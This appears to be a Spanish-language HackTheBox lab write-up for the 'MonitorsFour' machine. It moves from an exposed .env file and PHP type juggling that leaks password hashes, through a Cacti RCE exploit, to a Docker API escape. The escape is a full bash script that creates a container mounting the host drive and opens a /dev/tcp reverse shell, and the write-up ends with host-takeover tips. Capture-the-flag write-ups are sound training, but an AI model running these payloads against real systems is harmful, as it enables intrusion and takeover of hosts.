@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+
+<html lang="es">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>MonitorsFour | ZsZsec</title>
+<meta content="Enumeración web, Cacti, explotación autenticada, cracking de hash, Docker y escalada hasta root." name="description"/>
+<meta content="#000000" name="theme-color"/>
+<link href="../assets/favicon.svg" rel="icon" type="image/svg+xml"/>
+<link href="../assets/style.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="scanline"></div>
+<header class="site-header">
+<a aria-label="Inicio" class="brand" href="../index.html"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+<nav aria-label="Navegación principal" class="nav"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link" href="../articulos.html">Artículos</a><a class="nav-link active" href="../writeups.html">Writeups</a></nav>
+</header>
+<main>
+<section class="page-hero compact">
+<p class="eyebrow">HackTheBox</p>
+<h1>MonitorsFour<span>_</span></h1>
+<div class="writeup-meta"><span>HackTheBox / Cacti / CVE</span></div>
+<div class="tag-row"><span class="tag">HackTheBox</span><span class="tag">Cacti</span><span class="tag">CVE</span><span class="tag">Docker</span><span class="tag">Linux</span></div>
+</section>
+<section class="content-shell">
+<article class="markdown-body"><p>Primero se realizo un escaneo de nmap ---&gt; se detecto puerto winrm y 80 ----&gt; feroxbuster a web -----&gt; detectamos subdominio corriendo cacti version  1.2.28 -----&gt; en el parametro /forgot-password al interceptar la peticion vemos que se hace una peticion por GET a la api ---&gt; /api/v1/users nos da esta respuesta {"error":"Missing token parameter"} ----&gt; agregamos el parametro  /api/v1/users?token y nos da esta respuesta "error":"Invalid or missing token" ---&gt; agregamos  /api/v1/users?token=0 y sucede la magia ---&gt; <code>PHP Type Juggling</code>  -----&gt; crackeamos el hash de administrador ---&gt; <code>wonderful1</code> luego entramos a cacti con el usuario <code>marcus</code> y la contrasena <code>wonderful1</code> ---&gt; se explota <code>CVE-2025-24367 - Cacti Authenticated Graph Template RCE</code> <a href="https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC">https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC</a> ----&gt; enumeracion interna y escape del contenedor -----&gt;  ./fscan -h 192.168.65.7 -p 1-65535
+se pasa binario estatico de fscan y detectamos puertos abiertos <code> http://192.168.65.7:2375 poc-yaml-docker-api-unauthorized-rce</code>  ----&gt; enumeracion de docker mediante curl ----&gt; CVE-2025-9074 (Docker API Escape) ----&gt; root</p>
+<h1>Introduccion</h1>
+<h1>Reconocimiento</h1>
+<p>Empezamos realizando un escaneo de reconocimiento con la herramienta nmap sobre la ip <code>10.10.11.98</code> para detectar los puertos abiertos</p>
+<pre><code class="language-bash">nmap -p- -Pn --min-rate 2500 10.10.11.98 -oN basico 
+PORT     STATE SERVICE
+80/tcp   open  http
+5985/tcp open  wsman
+</code></pre>
+<p>Entonces decidimos realizar un escaneo aun mas exhaustivo sobre los servicios expuestos</p>
+<pre><code class="language-bash">
+└─$ nmap -p80,5985 -sC -sV -Pn --min-rate 2500 10.10.11.98 -oN exhaustivo 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-13 18:09 EST
+Nmap scan report for 10.10.11.98
+Host is up (0.76s latency).
+
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    nginx
+|_http-title: Did not follow redirect to http://monitorsfour.htb/
+5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</code></pre>
+<p>Con este escaneo ahora somos capaces de profundizar mas en las posibles vulnerabilidades que puedan tener estos servicios expuestos, tambien vemos que nos redirecciona a un dominio <code>monitorsfour.htb</code> asi que agregaremos ese dominio al archivo /etc/hosts</p>
+<pre><code>80/tcp   open  http    nginx
+5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</code></pre>
+<h1>Enumeracion web</h1>
+<p>Dado que el servicio HTTP se encuentra expuesto en el puerto <code>80</code>, se procedió a realizar una enumeración exhaustiva de la aplicación web con el objetivo de identificar rutas, archivos y recursos accesibles.</p>
+<p>Para ello, se ejecutó un <strong>fuzzing intensivo de directorios y archivos</strong> utilizando la herramienta <code>feroxbuster</code>, empleando un diccionario amplio y una gran variedad de extensiones comunes, con el fin de maximizar la superficie de ataque descubierta.</p>
+<h3>Fuzzing de directorios con Feroxbuster</h3>
+<pre><code class="language-bash">┌──(zikuta㉿zikuta)-[~/Desktop/htb/monitorsfour]
+└─$ feroxbuster -u http://monitorsfour.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt,js,json,xml,zip,tar,gz,bak,old,sql,log,config,ini,yml,yaml,conf,md,csv,pdf,doc,docx,xls,xlsx,asp,aspx,jsp,jspx,do,action,cgi,pl,py,sh,rb,go,env,git,svn,bkp,swp,tmp,db,sqlite,mdb
+
+                                                                                                                              
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.13.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://monitorsfour.htb/
+ 🚩  In-Scope Url          │ monitorsfour.htb
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.13.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [php, html, txt, js, json, xml, zip, tar, gz, bak, old, sql, log, config, ini, yml, yaml, conf, md, csv, pdf, doc, docx, xls, xlsx, asp, aspx, jsp, jspx, do, action, cgi, pl, py, sh, rb, go, env, git, svn, bkp, swp, tmp, db, sqlite, mdb]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+403      GET        7l        9w      146c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                     
+404      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                     
+404      GET        7l       11w      146c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                     
+200      GET        1l      235w    12063c http://monitorsfour.htb/static/images/review.svg
+200      GET        5l       30w     1616c http://monitorsfour.htb/static/images/services/01.png
+200      GET       24l       99w      770c http://monitorsfour.htb/static/js/smoothscroll.js
+200      GET      109l      619w    13655c http://monitorsfour.htb/static/images/service.svg
+200      GET       11l       15w      188c http://monitorsfour.htb/static/css/plugins.css
+200      GET        6l       34w     2166c http://monitorsfour.htb/static/images/services/02.png
+200      GET       71l      130w     1872c http://monitorsfour.htb/static/js/custom.js
+200      GET       38l      117w     2813c http://monitorsfour.htb/static/js/plugins.js
+200      GET      935l     1752w    15174c http://monitorsfour.htb/static/css/style.css
+200      GET        7l      277w    44342c http://monitorsfour.htb/static/js/owl.carousel.min.js
+200      GET       19l       62w     3695c http://monitorsfour.htb/static/images/services/04.png
+200      GET        9l       43w     3028c http://monitorsfour.htb/static/images/services/03.png
+200      GET        1l      393w    15974c http://monitorsfour.htb/static/images/about-us.svg
+200      GET        5l      369w    21003c http://monitorsfour.htb/static/js/popper.min.js
+200      GET      129l      673w    57007c http://monitorsfour.htb/static/admin/assets/images/logo.png
+200      GET        1l      359w    22207c http://monitorsfour.htb/static/images/banner.svg
+200      GET        7l      683w    60010c http://monitorsfour.htb/static/js/bootstrap.min.js
+200      GET       87l     1326w   157954c http://monitorsfour.htb/static/admin/assets/images/logo.ico
+200      GET        4l     1293w    86709c http://monitorsfour.htb/static/js/jquery-min.js
+200      GET        6l      184w     9227c http://monitorsfour.htb/static/admin/assets/js/plugins/loaders/blockui.min.js
+200      GET        2l      210w    12507c http://monitorsfour.htb/static/admin/assets/js/plugins/loaders/pace.min.js
+200      GET        7l      430w    36816c http://monitorsfour.htb/static/admin/assets/js/core/libraries/bootstrap.min.js
+200      GET      607l     1130w    16986c http://monitorsfour.htb/static/admin/assets/js/core/app.js
+200      GET        1l        1w    37820c http://monitorsfour.htb/static/admin/assets/css/minified/colors.min.css
+200      GET     1190l     1226w    47483c http://monitorsfour.htb/static/admin/assets/css/icons/icomoon/styles.css
+200      GET        4l     1305w    84345c http://monitorsfour.htb/static/admin/assets/js/core/libraries/jquery.min.js
+200      GET        1l     1733w   122310c http://monitorsfour.htb/static/admin/assets/css/minified/bootstrap.min.css
+200      GET        1l     1430w   108349c http://monitorsfour.htb/static/admin/assets/css/minified/core.min.css
+200      GET        1l     5059w   256503c http://monitorsfour.htb/static/admin/assets/css/minified/components.min.css
+200      GET        4l       35w      367c http://monitorsfour.htb/contact
+200      GET       96l      239w     4340c http://monitorsfour.htb/login
+200      GET     4734l    29110w  2364586c http://monitorsfour.htb/static/admin/assets/images/servers.png
+200      GET       84l      212w     3099c http://monitorsfour.htb/forgot-password
+200      GET      338l      982w    13688c http://monitorsfour.htb/
+200      GET        5l        5w       97c http://monitorsfour.htb/.env
+200      GET        1l        3w       35c http://monitorsfour.htb/user
+301      GET        7l       11w      162c http://monitorsfour.htb/static =&gt; http://monitorsfour.htb/static/
+301      GET        7l       11w      162c http://monitorsfour.htb/static/images =&gt; http://monitorsfour.htb/static/images/
+301      GET        7l       11w      162c http://monitorsfour.htb/static/images/blog =&gt; http://monitorsfour.htb/static/images/blog/
+301      GET        7l       11w      162c http://monitorsfour.htb/static/images/services =&gt; http://monitorsfour.htb/static/images/services/
+301      GET        7l       11w      162c http://monitorsfour.htb/static/admin =&gt; http://monitorsfour.htb/static/admin/
+301      GET        7l       11w      162c http://monitorsfour.htb/static/css =&gt; http://monitorsfour.htb/static/css/
+301      GET        7l       11w      162c http://monitorsfour.htb/static/admin/assets =&gt; http://monitorsfour.htb/static/admin/assets/
+301      GET        7l       11w      162c http://monitorsfour.htb/static/js 
+</code></pre>
+<p>Durante el escaneo se permitió la recursión y se aceptaron todos los códigos de estado HTTP, lo que facilitó la detección de recursos tanto públicos como potencialmente sensibles.</p>
+<h3>Resultados relevantes</h3>
+<p>El fuzzing reveló múltiples recursos accesibles, principalmente archivos estáticos y rutas funcionales de la aplicación:</p>
+<h4>Rutas funcionales destacadas</h4>
+<ul>
+<li><code>/login</code> – Página de autenticación.</li>
+<li><code>/forgot-password</code> – Funcionalidad de recuperación de contraseña.</li>
+<li><code>/contact</code> – Página de contacto.</li>
+<li><code>/user</code> – Ruta potencialmente asociada a perfiles de usuario.</li>
+</ul>
+<h4>Archivos y recursos sensibles</h4>
+<ul>
+<li><code>/.env</code> – Archivo de variables de entorno <strong>accesible públicamente</strong>, lo cual representa un <strong>riesgo crítico</strong>, ya que puede contener credenciales, claves API u otra información sensible.</li>
+</ul>
+<h4>Estructura estática</h4>
+<p>Se identificó una estructura extensa de archivos estáticos bajo el directorio <code>/static/</code>, incluyendo:</p>
+<ul>
+<li>Recursos CSS y JavaScript.</li>
+<li>Imágenes.</li>
+<li>Un panel administrativo ubicado en <code>/static/admin/</code>, lo que sugiere la posible existencia de una interfaz administrativa o backend asociado.</li>
+</ul>
+<hr/>
+<h3>Conclusión inicial</h3>
+<p>La enumeración web permitió identificar <strong>rutas clave de la aplicación</strong>, así como la exposición directa del archivo <code>.env</code>, lo que indica una <strong>mala configuración del servidor</strong>. Este hallazgo abre la puerta a una posible <strong>comprometida inicial</strong> mediante la obtención de credenciales o secretos de la aplicación, por lo que será analizado en profundidad en las siguientes fases del ataque.</p>
+<p>Al ir a el directorio <code>/.env</code> se me descargo el archivo <code>.env</code> que contenia</p>
+<pre><code class="language-bash">└─$ cat Untitled.env     
+DB_HOST=mariadb
+DB_PORT=3306
+DB_NAME=monitorsfour_db
+DB_USER=monitorsdbuser
+DB_PASS=f37p2j8f4t0r
+</code></pre>
+<h2>Enumeracion web fase 2</h2>
+<p>Continuando con la enumeracion web decidi realizar un escaneo de subdominios a ver si podia encontrar algun subdominio interesante</p>
+<pre><code class="language-bash">┌──(zikuta㉿zikuta)-[~/Downloads]
+└─$ ffuf -u http://monitorsfour.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.monitorsfour.htb"  -fs 138
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://monitorsfour.htb
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+ :: Header           : Host: FUZZ.monitorsfour.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 138
+________________________________________________
+
+cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 138ms]
+</code></pre>
+<p>Encontramos el subdominio <code>cacti</code> asi que lo agregamos en nuestro <code>/etc/hosts</code></p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/caf31542-ec14-4358-a427-ab7977cc65d2"/></p>
+<p>nos damos cuenta que esta corriendo al version <code>1.2.28</code> asi que mientras investigabamos si esta version de <code>cacti</code> tenia vulnerabilidades, nos encontramos con  <code>CVE-2025-24367</code>, pero eso la explotaremos en breves.</p>
+<h3>Enumeracion web fase 3</h3>
+<p>Mientras buscaba credenciales para poder entrar al panel de administracion de <code>cacti</code> me encontre con un directorio en la web que me daba un output bastante interesante</p>
+<pre><code class="language-bash">
+# REQUEST
+
+GET /user HTTP/1.1
+
+Host: monitorsfour.htb
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate, br
+
+Connection: keep-alive
+
+Cookie: PHPSESSID=23e0eca70bec6e16036c40f38dbff8d5
+
+Upgrade-Insecure-Requests: 1
+
+Priority: u=0, i
+
+
+# RESPONSE
+
+HTTP/1.1 200 OK
+
+Server: nginx
+
+Date: Sun, 14 Dec 2025 00:54:49 GMT
+
+Content-Type: text/html; charset=UTF-8
+
+Connection: keep-alive
+
+X-Powered-By: PHP/8.3.27
+
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+
+Cache-Control: no-store, no-cache, must-revalidate
+
+Pragma: no-cache
+
+Content-Length: 35
+
+
+{"error":"Missing token parameter"}
+
+</code></pre>
+<p>Este output me hacia entender que faltaba el parametro <code>"token"</code>  asi que decidi agregarlo en la <code>url</code></p>
+<pre><code class="language-bash">
+# REQUEST
+
+GET /user?token HTTP/1.1
+
+Host: monitorsfour.htb
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate, br
+
+Connection: keep-alive
+
+Cookie: PHPSESSID=23e0eca70bec6e16036c40f38dbff8d5
+
+Upgrade-Insecure-Requests: 1
+
+Priority: u=0, i
+
+# RESPONSE
+
+HTTP/1.1 200 OK
+
+Server: nginx
+
+Date: Sun, 14 Dec 2025 00:58:50 GMT
+
+Content-Type: application/json
+
+Connection: keep-alive
+
+X-Powered-By: PHP/8.3.27
+
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+
+Cache-Control: no-store, no-cache, must-revalidate
+
+Pragma: no-cache
+
+Content-Length: 36
+
+
+{"error":"Invalid or missing token"}
+</code></pre>
+<p>El servidor me responde con un error <code>"Invalid or missing token"</code> asi que decidi agregarle el numero 0 al token</p>
+<pre><code class="language-bash">
+# REQUEST
+
+GET /user?token=0 HTTP/1.1
+
+Host: monitorsfour.htb
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate, br
+
+Connection: keep-alive
+
+Cookie: PHPSESSID=23e0eca70bec6e16036c40f38dbff8d5
+
+Upgrade-Insecure-Requests: 1
+
+Priority: u=0, i
+
+# RESPONSE
+
+HTTP/1.1 200 OK
+
+Server: nginx
+
+Date: Sun, 14 Dec 2025 00:59:58 GMT
+
+Content-Type: text/html; charset=UTF-8
+
+Connection: keep-alive
+
+X-Powered-By: PHP/8.3.27
+
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+
+Cache-Control: no-store, no-cache, must-revalidate
+
+Pragma: no-cache
+
+Content-Length: 1113
+
+[{"id":2,"username":"admin","email":"admin@monitorsfour.htb","password":"56b32eb43e6f15395f6c46c1c9e1cd36","role":"super user","token":"b398bb5b910c60a960","name":"Marcus Higgins","position":"System Administrator","dob":"1978-04-26","start_date":"2021-01-12","salary":"320800.00"},{"id":5,"username":"mwatson","email":"mwatson@monitorsfour.htb","password":"69196959c16b26ef00b77d82cf6eb169","role":"user","token":"0e543210987654321","name":"Michael Watson","position":"Website Administrator","dob":"1985-02-15","start_date":"2021-05-11","salary":"75000.00"},{"id":6,"username":"janderson","email":"janderson@monitorsfour.htb","password":"2a22dcf99190c322d974c8df5ba3256b","role":"user","token":"0e999999999999999","name":"Jennifer Anderson","position":"Network Engineer","dob":"1990-07-16","start_date":"2021-06-20","salary":"68000.00"},{"id":7,"username":"dthompson","email":"dthompson@monitorsfour.htb","password":"8d4a7e7fd08555133e056d9aacb1e519","role":"user","token":"0e111111111111111","name":"David Thompson","position":"Database Manager","dob":"1982-11-23","start_date":"2022-09-15","salary":"83000.00"}]
+</code></pre>
+<p>hemos explotado <code>PHP TYPE JUGGLING</code></p>
+<h1>Hash</h1>
+<p>Una vez hemos obtenido el <code>hash</code> del usuario <code>admin</code> procederemos a intentar crackearlo utilizando la herramienta <code>john the ripper</code> y la wordlists de <code>rockyou.txt</code></p>
+<pre><code class="language-bash">└─$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt  hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=3
+Press 'q' or Ctrl-C to abort, almost any other key for status
+wonderful1       (?)     
+1g 0:00:00:00 DONE (2025-12-13 19:49) 50.00g/s 844800p/s 844800c/s 844800C/s lachina..fleming
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed. 
+</code></pre>
+<p>hash crackeado exitosamente.</p>
+<p>Ahora con esas credenciales podemos entrar al panel de administracion del sitio web.</p>
+<h1>Cacti</h1>
+<p>En el sitio web me doy cuenta que el  administrador del sistema es el usuario <code>Marcus Higgins</code> asi que intuyo que probablemente ese sea el usuario administrador del panel de <code>cacti</code> asi que hago password reuse y utilizo a marcus como usuario</p>
+<p>y logro acceder exitosamente como el usuario <code>marcus</code> al panel e cacti utilizando la contrasena <code>wonderful1</code></p>
+<h1>CVE-2025-24367 - Cacti Authenticated Graph Template RCE</h1>
+<p>Una vez estamos autenticados en el panel de cacti tenemos la capacidad de poder explotar la vulnerabilidad de <code>CVE-2025-24367 - Cacti Authenticated Graph Template RCE</code> asi que buscando en internet algun PoC me encontre con este <a href="https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC">https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC</a></p>
+<h1>Explotacion</h1>
+<pre><code class="language-bash">┌──(zikuta㉿zikuta)-[~/Desktop/pocs/CVE-2025-24367-Cacti-PoC]
+└─$ python3 exploit.py  -u marcus -p wonderful1 -url http://cacti.monitorsfour.htb -i 10.10.17.173 -l 4444  
+[+] Cacti Instance Found!
+[+] Serving HTTP on port 80
+[+] Login Successful!
+[+] Got graph ID: 226
+[i] Created PHP filename: 30BZK.php
+[+] Got payload: /bash
+[i] Created PHP filename: WOmmT.php
+[+] Hit timeout, looks good for shell, check your listener!
+[+] Stopped HTTP server on port 80
+</code></pre>
+<p>Nos ponemos en escucha con la herramienta <code>penelope</code> para recibir la <code>reverse shell</code></p>
+<pre><code class="language-bash">└─$ penelope -p 4444     
+[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 10.10.17.173
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] Got reverse shell from 821fbd6a43fa~10.10.11.98-Linux-x86_64 😍 Assigned SessionID &lt;1&gt;
+[+] Attempting to upgrade shell to PTY...
+[!] Python agent cannot be deployed. I need to maintain at least one Raw session to handle the PTY
+[+] Attempting to spawn a reverse shell on 10.10.17.173:4444
+[-] Failed spawning new session
+[+] Interacting with session [1], Shell Type: Raw, Menu key: Ctrl-C 
+[+] Logging to /home/zikuta/.penelope/sessions/821fbd6a43fa~10.10.11.98-Linux-x86_64/2025_12_13-20_09_40-972.log 📜
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+[+] Got reverse shell from 821fbd6a43fa~10.10.11.98-Linux-x86_64 😍 Assigned SessionID &lt;2&gt;
+www-data@821fbd6a43fa:~/html/cacti$ 
+
+</code></pre>
+<p>leemos la flag <code>a897933ec296767e92d5b049c8fd8388</code></p>
+<h1>Enumeracion interna</h1>
+<p>Al leer el archivo <code>/etc/resolv.conf</code> nos encontramos con algo muy interesante</p>
+<pre><code class="language-bash">www-data@821fbd6a43fa:/tmp$ cat /etc/resolv.conf
+cat /etc/resolv.conf
+# Generated by Docker Engine.
+# This file can be edited; Docker Engine will not make further changes once it
+# has been modified.
+
+nameserver 127.0.0.11
+options ndots:0
+
+# Based on host file: '/etc/resolv.conf' (internal resolver)
+ ExtServers: [host(192.168.65.7)]
+# Overrides: []
+# Option ndots from: internal
+</code></pre>
+<p>Parece que estamos  en un contenedor de <code>docker</code> y las peticiones se estan resolviendo al hosts interno <code>192.168.65.7</code></p>
+<p>asi que con curl nos pasamos la herramienta <code>fscan</code> para detectar puertos abiertos en el host interno</p>
+<pre><code class="language-bash">www-data@821fbd6a43fa:/tmp$ ./main -p 1-65535 -h 192.168.65.7
+
+┌──────────────────────────────────────────────┐
+│    ___                              _        │
+│   / _ \     ___  ___ _ __ __ _  ___| | __    │
+│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
+│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │
+│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
+└──────────────────────────────────────────────┘
+      Fscan Version: 2.0.1
+                                                                                                                              
+[23.2s]     已选择服务扫描模式                                                                                                
+[23.2s]     开始信息扫描
+[23.2s]     最终有效主机数量: 1
+[23.2s]     开始主机扫描
+[23.2s]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle                                                                                                
+[23.3s]     有效端口数量: 65535
+[23.9s] [*] 端口开放 192.168.65.7:53
+[25.8s] [*] 端口开放 192.168.65.7:2375
+[26.2s] [*] 端口开放 192.168.65.7:3128
+[28.1s] [*] 端口开放 192.168.65.7:5555
+[1m4s]     扫描完成, 发现 4 个开放端口
+[1m4s]     存活端口数量: 4
+[1m4s]     开始漏洞扫描
+[1m5s] [*] 网站标题 http://192.168.65.7:2375  状态码:404 长度:29     标题:无标题
+[1m5s]     POC加载完成: 总共387个，成功387个，失败0个
+[1m5s] [*] 网站标题 http://192.168.65.7:5555  状态码:200 长度:0      标题:无标题
+[2m56s]     扫描已完成: 6/6
+</code></pre>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/f4832644-873e-43f2-a2e0-b6a5b2437d9e"/></p>
+<p>En el escaneo detectamos que uno de los puertos, para ser mas exactos el puerto <code>2375</code> corresponde  a <code>Docker Engine Api</code> Entonces decido enumerarlo a ver si tiene alguna version vulnerable</p>
+<p>Esto lo hago a traves de curl</p>
+<pre><code class="language-bash">www-data@821fbd6a43fa:/tmp$ curl http://192.168.65.7:2375/version                  
+{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"28.3.2","Details":{"ApiVersion":"1.51","Arch":"amd64","BuildTime":"2025-07-09T16:13:55.000000000+00:00","Experimental":"false","GitCommit":"e77ff99","GoVersion":"go1.24.5","KernelVersion":"6.6.87.2-microsoft-standard-WSL2","MinAPIVersion":"1.24","Os":"linux"}},{"Name":"containerd","Version":"1.7.27","Details":{"GitCommit":"05044ec0a9a75232cad458027ca83437aae3f4da"}},{"Name":"runc","Version":"1.2.5","Details":{"GitCommit":"v1.2.5-0-g59923ef"}},{"Name":"docker-init","Version":"0.19.0","Details":{"GitCommit":"de40ad0"}}],"Version":"28.3.2","ApiVersion":"1.51","MinAPIVersion":"1.24","GitCommit":"e77ff99","GoVersion":"go1.24.5","Os":"linux","Arch":"amd64","KernelVersion":"6.6.87.2-microsoft-standard-WSL2","BuildTime":"2025-07-09T16:13:55.000000000+00:00"}
+</code></pre>
+<pre><code> Docker Engine Version:28.3.2  vulnerable a CVE-2025-9074 (Docker API Escape)</code></pre>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/6d07c8a0-5082-4a82-b02e-7c75061f9d45"/></p>
+<p>Una vez hemos detectado que es vulnerable a <code>CVE-2025-9074</code> procederemos a explotarla mediante un script en bash</p>
+<h1>#### CVE-2025-9074 (Docker API Escape)</h1>
+<pre><code class="language-bash">#!/bin/bash
+
+DOCKER_HOST="http://192.168.65.7:2375"
+LHOST="10.10.17.173"
+LPORT="4445"
+
+echo "Enumerando imagenes..."
+curl -s "$DOCKER_HOST/images/json" | grep -o '"RepoTags":\["[^"]*"\]'
+
+echo "Creando contenedor malicioso..."
+JSON_PAYLOAD=$(cat &lt;&lt;EOF
+{
+  "Image": "docker_setup-nginx-php:latest",
+  "Cmd": ["/bin/bash","-c","bash -i &gt;&amp; /dev/tcp/$LHOST/$LPORT 0&gt;&amp;1"],
+  "HostConfig": {
+    "Binds": ["/mnt/host/c:/host_root"]
+  }
+}
+EOF
+)
+
+echo "$JSON_PAYLOAD" &gt; /tmp/create_container.json
+curl -H 'Content-Type: application/json' -d @/tmp/create_container.json "$DOCKER_HOST/containers/create" -o /tmp/response.json
+
+CID=$(grep -o '"Id":"[^"]*"' /tmp/response.json | cut -d'"' -f4)
+echo "Container ID: $CID"
+
+echo "Iniciando contenedor..."
+curl -X POST "$DOCKER_HOST/containers/$CID/start"
+
+echo "Listo. Escucha en $LHOST:$LPORT"
+</code></pre>
+<h2>1. <strong>Docker API sin autenticación</strong> (<code>:2375</code>)</h2>
+<ul>
+<li>Puerto 2375 es el Docker daemon API sin TLS</li>
+<li>No requiere autenticación → acceso total al Docker Engine</li>
+<li>Error de configuración típico en entornos comprometidos</li>
+</ul>
+<h2>2. <strong>Bind Mount con acceso completo al host</strong>:</h2>
+<p>json</p>
+<p>"Binds": ["/mnt/host/c:/host_root"]</p>
+<ul>
+<li>Monta la raíz del sistema host (<code>C:\</code> en Windows via WSL2) dentro del contenedor</li>
+<li>En Linux sería <code>/:/host_root</code> normalmente</li>
+<li>Te da acceso de <strong>lectura/escritura</strong> al filesystem completo del host</li>
+</ul>
+<h2>3. <strong>Comando con reverse shell como root</strong>:</h2>
+<p>bash</p>
+<p>"Cmd": ["/bin/bash","-c","bash -i &gt;&amp; /dev/tcp/$LHOST/$LPORT 0&gt;&amp;1"]</p>
+<ul>
+<li><p>El contenedor se ejecuta con UID 0 (root) por defecto</p>
+</li>
+<li><p>Desde dentro del contenedor puedes:</p>
+<ul>
+<li><p>Modificar archivos del host via <code>/host_root</code></p>
+</li>
+<li><p>Escalar a root del host mediante:</p>
+<p>bash</p>
+<h1>Desde la reverse shell en el contenedor</h1>
+<p>chroot /host_root /bin/bash</p>
+<p>O:</p>
+<p>bash</p>
+<p>nsenter --mount=/proc/1/ns/mnt /bin/bash</p>
+</li>
+</ul>
+</li>
+</ul>
+<h2>4. <strong>WSL2 Path <code>/mnt/host/c</code> específico</strong>:</h2>
+<ul>
+<li><p>En WSL2, <code>/mnt/host/c</code> es el acceso directo al filesystem de Windows</p>
+</li>
+<li><p>Con este montaje obtienes acceso administrativo al sistema Windows</p>
+</li>
+</ul>
+<h2>Escalada completa:</h2>
+<ol>
+<li><p><strong>Shell dentro del contenedor</strong> como root (contenedor)</p>
+</li>
+<li><p><strong>Acceso al filesystem del host</strong> via bind mount</p>
+</li>
+<li><p><strong>Modificar archivos críticos</strong> del host:</p>
+<ul>
+<li><p><code>/host_root/etc/passwd</code> (añadir usuario root)</p>
+</li>
+<li><p><code>/host_root/root/.ssh/authorized_keys</code> (SSH como root)</p>
+</li>
